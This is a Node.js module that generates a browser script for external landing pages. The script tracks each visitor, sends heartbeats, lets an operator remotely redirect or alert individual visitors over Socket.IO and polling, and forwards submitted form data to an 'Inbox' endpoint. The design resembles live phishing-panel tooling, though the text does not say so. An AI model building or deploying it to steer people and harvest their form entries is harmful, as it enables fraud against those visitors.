// ============================================================
// MEGA TOOLS — SMART REDIRECT ENGINE (Universal Runtime) v1.0
// Serves mega-redirect.js to external landing pages
// Auto-handles: tracking, socket, heartbeat, redirect, polling
// Public API: megaSubmit, megaGetVisitor, megaNavigate,
//             megaEvent, megaConfig, megaReady, megaVersion
// Zero impact on existing Backend logic
// ============================================================

function generateSmartRedirectScript(req) {
  const serverUrl = req ? (req.protocol + '://' + req.get('host')) : 'http://localhost:5000';
  
  return `// ============================================================
// MEGA TOOLS — Smart Redirect Engine v1.0
// Auto-handles: Visitor ID, Tracking, Socket.IO, Heartbeat,
//               Redirect Receive, Polling Fallback, Form Submit
// Just include this ONE script in your landing page:
//   <script src="${serverUrl}/mega-redirect.js"></script>
// ============================================================
(function(){
  "use strict";

  // ========== CONFIG ==========
  var API = "${serverUrl}";
  var DATA = API + "/api/data";
  var VERSION = "1.0.0";

  // ========== STATE ==========
  var _vid = null;
  var _code = null;
  var _socket = null;
  var _lastSeq = 0;
  var _retryCount = 0;
  var _pollTimer = null;
  var _redirected = false;
  var _connected = false;
  var _ready = false;
  var _readyCallbacks = [];
  var _eventListeners = {};
  var _config = {
    heartbeatMs: 8000,
    pollMs: 2000,
    retryMax: 3,
    autoVisit: true,
    autoHeartbeat: true,
    autoSocket: true,
    autoPolling: true
  };

  // ========== VISITOR ID ==========
  try { _vid = localStorage.getItem("_vid"); } catch(e) {}
  if (!_vid) {
    _vid = "v_" + Date.now() + "_" + Math.random().toString(36).substr(2, 6);
    try { localStorage.setItem("_vid", _vid); } catch(e) {}
  }

  // ========== TRACKING CODE ==========
  var p = window.location.pathname.split("/").filter(Boolean);
  _code = p[p.length - 1] || "default";

  // ========== INTERNAL EVENT BUS ==========
  function _emit(name, data) {
    if (_eventListeners[name]) {
      _eventListeners[name].forEach(function(fn){ try { fn(data); } catch(e){} });
    }
  }

  // ========== EXECUTE REDIRECT ==========
  function doRedirect(url) {
    if (_redirected || !url) return;
    _redirected = true;
    if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
    if (_socket && _socket.connected) { _socket.disconnect(); }
    _emit("REDIRECT", { url: url });
    window.location.href = url;
  }

  // ========== HTTP POLLING FALLBACK ==========
  function startPolling() {
    if (_pollTimer || !_config.autoPolling) return;
    _pollTimer = setInterval(function(){
      if (_redirected) { clearInterval(_pollTimer); return; }
      fetch(API + "/api/sessions/pending-command/" + encodeURIComponent(_code) + "?visitorId=" + encodeURIComponent(_vid) + "&seq=" + _lastSeq)
        .then(function(r){ return r.json(); })
        .then(function(d){
          if (d && d.pending && d.command && d.command.url) {
            if (d.command.seq && d.command.seq <= _lastSeq) return;
            _lastSeq = d.command.seq || _lastSeq;
            doRedirect(d.command.url);
          }
        }).catch(function(){});
    }, _config.pollMs);
  }

  // ========== VISIT TRACKING ==========
  function sendVisit() {
    if (!_config.autoVisit) return;
    fetch(DATA + "/visit", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        visitorId: _vid,
        trackingCode: _code,
        browser: (navigator.userAgent || "").substring(0, 200),
        device: /Mobi/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
        collectedTypes: ["visit"],
        timestamp: new Date().toISOString()
      }),
      keepalive: true
    }).catch(function(){});
  }

  // ========== HEARTBEAT ==========
  function sendHeartbeat(status) {
    if (!_config.autoHeartbeat) return;
    fetch(DATA + "/heartbeat", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        visitorId: _vid,
        trackingCode: _code,
        status: status || "Active",
        timestamp: new Date().toISOString()
      }),
      keepalive: true
    }).catch(function(){});
  }

  // ========== SOCKET.IO CONNECT ==========
  function connectSocket() {
    if (!_config.autoSocket) return;
    if (_socket && _socket.connected) return;
    if (_retryCount >= _config.retryMax) return;

    var scriptEl = document.createElement("script");
    scriptEl.src = API + "/socket.io/socket.io.js";
    scriptEl.onload = function(){
      _socket = io(API, {
        transports: ["websocket", "polling"],
        reconnection: true,
        reconnectionAttempts: 5,
        timeout: 10000
      });

      _socket.on("connect", function(){
        _connected = true;
        _retryCount = 0;
        _socket.emit("session_init", { visitorId: _vid, trackingCode: _code });
        _socket.emit("joinRoom", _code);
        _emit("SOCKET_CONNECTED", {});
      });

      _socket.on("disconnect", function(){
        _connected = false;
        _emit("SOCKET_DISCONNECTED", {});
        _retryCount++;
        if (_retryCount < _config.retryMax) {
          setTimeout(connectSocket, 3000);
        }
      });

      // ===== LAYER 1: session_command =====
      _socket.on("session_command", function(cmd){
        if (!cmd || _redirected) return;
        if (cmd.visitorId && cmd.visitorId !== _vid) return;
        if (cmd.seq && cmd.seq <= _lastSeq) return;
        _lastSeq = cmd.seq || _lastSeq;
        if (cmd.url && (cmd.action === "navigate" || cmd.action === "navigate+message")) {
          _emit("MESSAGE_RECEIVED", cmd);
          doRedirect(cmd.url);
        }
      });

      // ===== LAYER 2: global_command =====
      _socket.on("global_command", function(cmd){
        if (!cmd || _redirected) return;
        if (cmd.visitorId && cmd.visitorId !== _vid) return;
        if (cmd.seq && cmd.seq <= _lastSeq) return;
        _lastSeq = cmd.seq || _lastSeq;
        if (cmd.url) doRedirect(cmd.url);
      });

      // ===== LAYER 3: nav_update =====
      _socket.on("nav_update", function(d){
        if (d && d.targetUrl && !_redirected) doRedirect(d.targetUrl);
      });

      // ===== LAYER 4: msg_push =====
      _socket.on("msg_push", function(d){
        if (d && d.message && window.alert) alert(d.message);
        if (d && d.targetUrl && !_redirected) doRedirect(d.targetUrl);
      });

      _socket.on("connect_error", function(){
        _connected = false;
        _retryCount++;
      });
    };
    scriptEl.onerror = function(){
      _retryCount++;
    };
    document.head.appendChild(scriptEl);
  }

  // ========== MARK READY ==========
  function markReady() {
    if (_ready) return;
    _ready = true;
    _emit("SESSION_READY", { visitorId: _vid, trackingCode: _code });
    _emit("PAGE_READY", { visitorId: _vid, trackingCode: _code, version: VERSION });
    _readyCallbacks.forEach(function(fn){ try { fn(); } catch(e){} });
    _readyCallbacks = [];
  }

  // ============================================================
  // PUBLIC API
  // ============================================================

  // megaSubmit(data) — Send form data to Mega Tools Inbox
  window.megaSubmit = function(data) {
    if (!data) return;
    var payload = {
      formData: data,
      trackingCode: _code,
      visitorId: _vid,
      ip: "0.0.0.0",
      collectedTypes: ["form_submit"],
      timestamp: new Date().toISOString()
    };
    fetch(DATA + "/submit", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(payload),
      keepalive: true
    }).catch(function(){});
    _emit("FORM_SUBMIT", data);
  };

  // megaGetVisitor() — Returns visitor info
  window.megaGetVisitor = function() {
    return { visitorId: _vid, trackingCode: _code, connected: _connected, ready: _ready, version: VERSION };
  };

  // megaNavigate(url) — Redirect to another URL
  window.megaNavigate = function(url) {
    if (!url) return;
    _emit("STEP_CHANGED", { url: url });
    doRedirect(url);
  };

  // megaEvent(name, callback) — Listen to internal events
  // Events: SESSION_READY, PAGE_READY, SOCKET_CONNECTED,
  //         SOCKET_DISCONNECTED, FORM_SUBMIT, REDIRECT,
  //         MESSAGE_RECEIVED, STEP_CHANGED, OFFLINE, ONLINE
  window.megaEvent = function(name, callback) {
    if (!name || typeof callback !== "function") return;
    if (!_eventListeners[name]) _eventListeners[name] = [];
    _eventListeners[name].push(callback);
    // Fire immediately if already ready and matching event
    if (name === "SESSION_READY" && _ready) { try { callback({ visitorId: _vid, trackingCode: _code }); } catch(e){} }
    if (name === "PAGE_READY" && _ready) { try { callback({ visitorId: _vid, trackingCode: _code, version: VERSION }); } catch(e){} }
    if (name === "SOCKET_CONNECTED" && _connected) { try { callback({}); } catch(e){} }
  };

  // megaConfig(key, value) — Override runtime config
  window.megaConfig = function(key, value) {
    if (!key) return _config;
    if (value === undefined) return _config[key];
    _config[key] = value;
    return _config[key];
  };

  // megaReady(callback) — Run when runtime is fully initialized
  window.megaReady = function(callback) {
    if (typeof callback !== "function") return;
    if (_ready) { try { callback(); } catch(e){} }
    else { _readyCallbacks.push(callback); }
  };

  // megaVersion() — Returns runtime version
  window.megaVersion = function() {
    return VERSION;
  };

  // ========== INIT ==========
  sendVisit();
  startPolling();
  connectSocket();

  // Heartbeat interval
  setInterval(function(){ sendHeartbeat("Active"); }, _config.heartbeatMs);

  // Offline on beforeunload
  window.addEventListener("beforeunload", function(){
    _emit("OFFLINE", {});
    sendHeartbeat("Offline");
  });

  // Page load complete
  window.addEventListener("load", function(){
    _emit("ONLINE", {});
    markReady();
  });

  // If page already loaded
  if (document.readyState === "complete") {
    setTimeout(markReady, 100);
  }

})();`;
}

module.exports = { generateSmartRedirectScript };